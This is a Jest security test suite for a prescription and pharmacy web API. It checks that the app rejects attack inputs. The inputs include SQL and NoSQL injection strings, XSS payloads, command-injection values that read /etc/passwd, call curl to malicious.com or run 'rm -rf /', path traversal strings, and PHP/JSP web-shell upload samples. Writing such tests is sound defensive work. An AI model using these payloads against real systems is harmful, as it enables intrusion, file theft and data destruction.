// Security Penetration Testing Suite
import { describe, test, expect, beforeAll, afterAll } from '@jest/globals';
import request from 'supertest';
import app from '../server.js';
import { createHash } from 'crypto';
import jwt from 'jsonwebtoken';

describe('Security Penetration Tests', () => {
  let testUser;
  let validToken;

  beforeAll(async () => {
    // Create a test user for security testing
    const response = await request(app)
      .post('/api/v1/auth/register')
      .send({
        name: 'Security Test User',
        email: 'security@test.com',
        password: 'SecurePassword123!',
        role: 'patient'
      });

    testUser = response.body.data.user;
    validToken = response.body.data.token;
  });

  describe('Authentication Security Tests', () => {
    test('should prevent SQL injection in login', async () => {
      const sqlInjectionPayloads = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM users --",
        "admin'--",
        "admin'/*",
        "' OR 1=1#",
        "') OR ('1'='1",
        "' OR 'a'='a"
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await request(app)
          .post('/api/v1/auth/login')
          .send({
            email: payload,
            password: payload
          });

        // Should not succeed with SQL injection
        expect(response.status).not.toBe(200);
        expect(response.body.success).not.toBe(true);
      }
    });

    test('should prevent NoSQL injection in login', async () => {
      const noSQLInjectionPayloads = [
        { $ne: null },
        { $gt: "" },
        { $regex: ".*" },
        { $where: "return true" },
        { $exists: true },
        { $nin: [""] }
      ];

      for (const payload of noSQLInjectionPayloads) {
        const response = await request(app)
          .post('/api/v1/auth/login')
          .send({
            email: payload,
            password: payload
          });

        expect(response.status).toBe(400);
        expect(response.body.message).toContain('Validation failed');
      }
    });

    test('should prevent brute force attacks', async () => {
      const attempts = [];
      
      // Make multiple failed login attempts
      for (let i = 0; i < 10; i++) {
        attempts.push(
          request(app)
            .post('/api/v1/auth/login')
            .send({
              email: 'security@test.com',
              password: `wrongpassword${i}`
            })
        );
      }

      const responses = await Promise.all(attempts);
      
      // Should get rate limited
      const rateLimitedResponses = responses.filter(res => res.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    test('should validate JWT token tampering', async () => {
      // Create tampered tokens
      const tamperedTokens = [
        validToken.slice(0, -10) + 'tampered123',
        validToken.replace('eyJ', 'XyJ'),
        'Bearer invalid.token.here',
        `${validToken}.tampered`,
        validToken.split('.').reverse().join('.')
      ];

      for (const token of tamperedTokens) {
        const response = await request(app)
          .get('/api/v1/users/profile')
          .set('Authorization', `Bearer ${token}`);

        expect(response.status).toBe(401);
        expect(response.body.message).toContain('Invalid token');
      }
    });

    test('should prevent privilege escalation', async () => {
      // Try to access admin endpoints with patient token
      const adminEndpoints = [
        '/api/v1/admin/users',
        '/api/v1/admin/pharmacies',
        '/api/v1/admin/analytics',
        '/api/v1/admin/system-config'
      ];

      for (const endpoint of adminEndpoints) {
        const response = await request(app)
          .get(endpoint)
          .set('Authorization', `Bearer ${validToken}`);

        expect(response.status).toBe(403);
        expect(response.body.message).toContain('Insufficient permissions');
      }
    });
  });

  describe('Input Validation Security Tests', () => {
    test('should prevent XSS attacks', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '"><script>alert("XSS")</script>',
        "'><script>alert('XSS')</script>",
        '<img src="x" onerror="alert(\'XSS\')">',
        '<svg onload="alert(\'XSS\')">',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(\'XSS\')">',
        '<body onload="alert(\'XSS\')">'
      ];

      for (const payload of xssPayloads) {
        const response = await request(app)
          .put('/api/v1/users/profile')
          .set('Authorization', `Bearer ${validToken}`)
          .send({
            name: payload,
            bio: payload
          });

        // Should either reject or sanitize the input
        if (response.status === 200) {
          expect(response.body.data.name).not.toContain('<script>');
          expect(response.body.data.bio).not.toContain('<script>');
        } else {
          expect(response.status).toBe(400);
        }
      }
    });

    test('should prevent command injection', async () => {
      const commandInjectionPayloads = [
        '$(cat /etc/passwd)',
        '`cat /etc/passwd`',
        '; cat /etc/passwd',
        '| cat /etc/passwd',
        '&& cat /etc/passwd',
        '|| cat /etc/passwd',
        '\n cat /etc/passwd',
        '$(curl http://malicious.com)',
        '`rm -rf /`'
      ];

      for (const payload of commandInjectionPayloads) {
        const response = await request(app)
          .post('/api/v1/prescriptions/search')
          .set('Authorization', `Bearer ${validToken}`)
          .send({
            query: payload,
            medication: payload
          });

        // Should not execute commands
        expect(response.status).not.toBe(500);
        if (response.body.data) {
          expect(response.body.data).not.toContain('root:');
          expect(response.body.data).not.toContain('/bin/bash');
        }
      }
    });

    test('should prevent path traversal attacks', async () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd'
      ];

      for (const payload of pathTraversalPayloads) {
        const response = await request(app)
          .get(`/api/v1/files/${encodeURIComponent(payload)}`);

        expect(response.status).not.toBe(200);
        expect(response.status).toBe(404); // Should not find system files
      }
    });

    test('should validate file upload security', async () => {
      const maliciousFiles = [
        { name: 'malware.exe', content: 'MZ\x90\x00\x03', type: 'application/x-executable' },
        { name: 'script.php', content: '<?php system($_GET["cmd"]); ?>', type: 'application/x-php' },
        { name: 'script.jsp', content: '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', type: 'application/java' },
        { name: 'script.js', content: 'require("child_process").exec("rm -rf /")', type: 'application/javascript' }
      ];

      for (const file of maliciousFiles) {
        const response = await request(app)
          .post('/api/v1/files/upload')
          .set('Authorization', `Bearer ${validToken}`)
          .attach('file', Buffer.from(file.content), file.name);

        // Should reject malicious files
        expect(response.status).toBe(400);
        expect(response.body.message).toContain('File type not allowed');
      }
    });
  });

  describe('Session Security Tests', () => {
    test('should prevent session hijacking', async () => {
      // Create a session
      const loginResponse = await request(app)
        .post('/api/v1/auth/login')
        .send({
          email: 'security@test.com',
          password: 'SecurePassword123!'
        });

      const sessionToken = loginResponse.body.data.token;

      // Try to use session from different IP/User-Agent
      const response = await request(app)
        .get('/api/v1/users/profile')
        .set('Authorization', `Bearer ${sessionToken}`)
        .set('User-Agent', 'Different-Browser/1.0')
        .set('X-Forwarded-For', '192.168.1.100');

      // Should detect suspicious activity
      expect(response.status).toBe(401);
    });

    test('should prevent session fixation', async () => {
      // Try to set a predetermined session ID
      const response = await request(app)
        .post('/api/v1/auth/login')
        .set('Cookie', 'sessionId=predetermined-session-id')
        .send({
          email: 'security@test.com',
          password: 'SecurePassword123!'
        });

      // Should create new session, not use predetermined one
      expect(response.headers['set-cookie']).toBeDefined();
      const sessionCookie = response.headers['set-cookie'][0];
      expect(sessionCookie).not.toContain('predetermined-session-id');
    });

    test('should enforce secure session cookies', async () => {
      const response = await request(app)
        .post('/api/v1/auth/login')
        .send({
          email: 'security@test.com',
          password: 'SecurePassword123!'
        });

      const cookies = response.headers['set-cookie'];
      if (cookies) {
        cookies.forEach(cookie => {
          expect(cookie).toMatch(/HttpOnly/i);
          expect(cookie).toMatch(/SameSite/i);
          if (process.env.NODE_ENV === 'production') {
            expect(cookie).toMatch(/Secure/i);
          }
        });
      }
    });
  });

  describe('API Security Tests', () => {
    test('should prevent API key brute force', async () => {
      const attempts = [];
      
      for (let i = 0; i < 20; i++) {
        attempts.push(
          request(app)
            .get('/api/v1/internal/system-status')
            .set('X-API-Key', `fake-key-${i}`)
        );
      }

      const responses = await Promise.all(attempts);
      
      // Should rate limit API key attempts
      const rateLimitedResponses = responses.filter(res => res.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    test('should prevent CSRF attacks', async () => {
      // Try to make state-changing request without proper CSRF protection
      const response = await request(app)
        .post('/api/v1/users/change-password')
        .set('Origin', 'http://malicious-site.com')
        .set('Referer', 'http://malicious-site.com/attack')
        .set('Authorization', `Bearer ${validToken}`)
        .send({
          currentPassword: 'SecurePassword123!',
          newPassword: 'NewPassword123!',
          confirmPassword: 'NewPassword123!'
        });

      // Should detect cross-origin request
      expect(response.status).toBe(403);
    });

    test('should validate request size limits', async () => {
      const largePayload = {
        data: 'x'.repeat(50 * 1024 * 1024) // 50MB payload
      };

      const response = await request(app)
        .post('/api/v1/users/profile')
        .set('Authorization', `Bearer ${validToken}`)
        .send(largePayload);

      expect(response.status).toBe(413); // Payload Too Large
    });

    test('should prevent HTTP parameter pollution', async () => {
      const response = await request(app)
        .get('/api/v1/pharmacies/discover?latitude=40.7128&latitude=41.0000&longitude=-74.0060&longitude=-75.0000')
        .set('Authorization', `Bearer ${validToken}`);

      // Should handle parameter pollution gracefully
      expect(response.status).toBe(400);
      expect(response.body.message).toContain('Validation failed');
    });
  });

  describe('Data Security Tests', () => {
    test('should prevent information disclosure', async () => {
      // Try to access sensitive system information
      const sensitiveEndpoints = [
        '/api/v1/system/config',
        '/api/v1/database/schema',
        '/api/v1/logs/system',
        '/api/v1/debug/info'
      ];

      for (const endpoint of sensitiveEndpoints) {
        const response = await request(app)
          .get(endpoint)
          .set('Authorization', `Bearer ${validToken}`);

        expect(response.status).not.toBe(200);
        expect(response.body).not.toHaveProperty('password');
        expect(response.body).not.toHaveProperty('secret');
        expect(response.body).not.toHaveProperty('private_key');
      }
    });

    test('should prevent mass assignment attacks', async () => {
      const response = await request(app)
        .put('/api/v1/users/profile')
        .set('Authorization', `Bearer ${validToken}`)
        .send({
          name: 'Updated Name',
          role: 'admin', // Try to escalate privileges
          isActive: true,
          permissions: ['admin', 'super_user'],
          _id: 'new-id',
          password: 'new-password'
        });

      // Should not allow unauthorized field updates
      if (response.status === 200) {
        expect(response.body.data.role).not.toBe('admin');
        expect(response.body.data.role).toBe('patient'); // Should remain patient
      }
    });

    test('should prevent data enumeration', async () => {
      // Try to enumerate user IDs
      const userIds = [
        '000000000000000000000001',
        '000000000000000000000002',
        '123456789012345678901234',
        'ffffffffffffffffffffffff'
      ];

      const responses = [];
      for (const id of userIds) {
        const response = await request(app)
          .get(`/api/v1/users/${id}`)
          .set('Authorization', `Bearer ${validToken}`);
        responses.push(response);
      }

      // Should not reveal which user IDs exist
      const unauthorizedResponses = responses.filter(res => res.status === 403);
      const notFoundResponses = responses.filter(res => res.status === 404);
      
      // All should return same error type
      expect(unauthorizedResponses.length + notFoundResponses.length).toBe(responses.length);
    });
  });

  describe('Business Logic Security Tests', () => {
    test('should prevent race conditions in critical operations', async () => {
      // Simulate concurrent password changes
      const promises = [];
      
      for (let i = 0; i < 5; i++) {
        promises.push(
          request(app)
            .post('/api/v1/users/change-password')
            .set('Authorization', `Bearer ${validToken}`)
            .send({
              currentPassword: 'SecurePassword123!',
              newPassword: `NewPassword${i}!`,
              confirmPassword: `NewPassword${i}!`
            })
        );
      }

      const responses = await Promise.all(promises);
      
      // Only one should succeed
      const successfulResponses = responses.filter(res => res.status === 200);
      expect(successfulResponses.length).toBeLessThanOrEqual(1);
    });

    test('should prevent workflow manipulation', async () => {
      // Create a prescription request
      const createResponse = await request(app)
        .post('/api/v1/prescription-requests')
        .set('Authorization', `Bearer ${validToken}`)
        .send({
          pharmacyId: '507f1f77bcf86cd799439011',
          medications: [{ name: 'Aspirin', dosage: '81mg', quantity: 30 }],
          urgency: 'normal'
        });

      const requestId = createResponse.body.data._id;

      // Try to skip workflow steps
      const response = await request(app)
        .put(`/api/v1/prescription-requests/${requestId}/status`)
        .set('Authorization', `Bearer ${validToken}`)
        .send({ status: 'completed' }); // Skip processing steps

      // Should not allow status manipulation by patients
      expect(response.status).toBe(403);
    });

    test('should validate business rule enforcement', async () => {
      // Try to create invalid prescription request
      const response = await request(app)
        .post('/api/v1/prescription-requests')
        .set('Authorization', `Bearer ${validToken}`)
        .send({
          pharmacyId: '507f1f77bcf86cd799439011',
          medications: [
            {
              name: 'Controlled Substance',
              dosage: '1000mg', // Excessive dosage
              quantity: 1000, // Excessive quantity
              frequency: 'Every minute'
            }
          ],
          urgency: 'critical'
        });

      // Should validate against business rules
      expect(response.status).toBe(400);
      expect(response.body.message).toContain('Invalid');
    });
  });

  describe('Error Handling Security Tests', () => {
    test('should not leak sensitive information in errors', async () => {
      // Trigger various errors
      const errorTriggers = [
        () => request(app).get('/api/v1/users/nonexistent'),
        () => request(app).post('/api/v1/invalid-endpoint'),
        () => request(app).get('/api/v1/admin/users').set('Authorization', 'Bearer invalid'),
        () => request(app).post('/api/v1/auth/login').send({ email: 'invalid', password: 'invalid' })
      ];

      for (const trigger of errorTriggers) {
        const response = await trigger();
        
        // Should not expose sensitive information
        expect(response.body.stack).toBeUndefined();
        expect(JSON.stringify(response.body)).not.toMatch(/password|secret|key|token/i);
        expect(JSON.stringify(response.body)).not.toMatch(/mongodb|mysql|postgres/i);
        expect(JSON.stringify(response.body)).not.toMatch(/c:\\|\/etc\/|\/var\/|\/usr\//i);
      }
    });

    test('should handle malformed requests gracefully', async () => {
      const malformedRequests = [
        () => request(app).post('/api/v1/auth/login').send('invalid-json'),
        () => request(app).post('/api/v1/auth/login').send(null),
        () => request(app).post('/api/v1/auth/login').send(Buffer.from('binary-data')),
        () => request(app).post('/api/v1/auth/login').set('Content-Type', 'application/xml').send('<xml></xml>')
      ];

      for (const req of malformedRequests) {
        const response = await req();
        
        // Should handle gracefully without crashing
        expect(response.status).toBe(400);
        expect(response.body.message).toBeDefined();
      }
    });
  });

  describe('Infrastructure Security Tests', () => {
    test('should have secure headers', async () => {
      const response = await request(app).get('/health');

      // Check security headers
      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['x-frame-options']).toBe('DENY');
      expect(response.headers['x-xss-protection']).toBe('1; mode=block');
      expect(response.headers['strict-transport-security']).toBeDefined();
      expect(response.headers['content-security-policy']).toBeDefined();
      
      // Should not expose server information
      expect(response.headers['server']).toBeUndefined();
      expect(response.headers['x-powered-by']).toBeUndefined();
    });

    test('should prevent clickjacking', async () => {
      const response = await request(app).get('/');
      
      expect(response.headers['x-frame-options']).toBe('DENY');
    });

    test('should enforce HTTPS in production', async () => {
      if (process.env.NODE_ENV === 'production') {
        const response = await request(app).get('/health');
        expect(response.headers['strict-transport-security']).toMatch(/max-age=\d+/);
      }
    });
  });
});

export default describe;
